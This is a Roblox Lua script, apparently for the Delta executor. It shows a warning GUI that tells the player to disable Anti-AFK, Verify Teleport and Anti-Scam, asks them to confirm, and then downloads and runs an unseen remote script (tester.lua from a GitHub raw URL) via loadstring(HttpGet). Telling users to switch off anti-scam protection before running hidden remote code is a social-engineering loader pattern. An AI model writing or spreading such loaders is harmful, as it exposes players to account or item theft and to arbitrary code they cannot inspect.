--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--// Cleanup any existing GUI
if PlayerGui:FindFirstChild("DeltaWarningGUI") then
    PlayerGui:FindFirstChild("DeltaWarningGUI"):Destroy()
end

--// Create Warning GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DeltaWarningGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 220)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -16, 0, 40)
title.Position = UDim2.new(0, 8, 0, 8)
title.BackgroundTransparency = 1
title.Text = "⚠ Turn off all on Delta settings ⚠"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(255, 85, 85)
title.Parent = mainFrame

local info = Instance.new("TextLabel")
info.Size = UDim2.new(1, -16, 0, 120)
info.Position = UDim2.new(0, 8, 0, 50)
info.BackgroundTransparency = 1
info.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
info.TextColor3 = Color3.fromRGB(220, 220, 220)
info.TextXAlignment = Enum.TextXAlignment.Left
info.TextYAlignment = Enum.TextYAlignment.Top
info.TextSize = 16
info.Font = Enum.Font.Gotham
info.Parent = mainFrame

local okBtn = Instance.new("TextButton")
okBtn.Size = UDim2.new(0, 160, 0, 40)
okBtn.Position = UDim2.new(0.5, -80, 1, -55)
okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
okBtn.Text = "Okay"
okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
okBtn.TextSize = 18
okBtn.Font = Enum.Font.GothamBold
okBtn.Parent = mainFrame
Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

--// Confirmation Step
okBtn.MouseButton1Click:Connect(function()
    mainFrame:Destroy()

    local confirmFrame = Instance.new("Frame")
    confirmFrame.Size = UDim2.new(0, 360, 0, 150)
    confirmFrame.Position = UDim2.new(0.5, -180, 0.5, -75)
    confirmFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    confirmFrame.Parent = screenGui
    Instance.new("UICorner", confirmFrame).CornerRadius = UDim.new(0, 12)

    local confirmText = Instance.new("TextLabel")
    confirmText.Size = UDim2.new(1, -20, 0, 60)
    confirmText.Position = UDim2.new(0, 10, 0, 10)
    confirmText.BackgroundTransparency = 1
    confirmText.Text = "✅ Did you disable everything in Delta settings?"
    confirmText.TextColor3 = Color3.fromRGB(255, 255, 200)
    confirmText.TextWrapped = true
    confirmText.Font = Enum.Font.GothamBold
    confirmText.TextSize = 18
    confirmText.Parent = confirmFrame

    local yesBtn = Instance.new("TextButton")
    yesBtn.Size = UDim2.new(0, 120, 0, 40)
    yesBtn.Position = UDim2.new(0.25, -60, 1, -50)
    yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
    yesBtn.Text = "Yes"
    yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    yesBtn.TextSize = 18
    yesBtn.Font = Enum.Font.GothamBold
    yesBtn.Parent = confirmFrame
    Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 10)

    local noBtn = Instance.new("TextButton")
    noBtn.Size = UDim2.new(0, 120, 0, 40)
    noBtn.Position = UDim2.new(0.75, -60, 1, -50)
    noBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    noBtn.Text = "No"
    noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    noBtn.TextSize = 18
    noBtn.Font = Enum.Font.GothamBold
    noBtn.Parent = confirmFrame
    Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 10)

    yesBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        -- Run your tester.lua script exactly as-is
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ceanimus1627/tester/refs/heads/main/tester.lua"))()
    end)

    noBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
end)
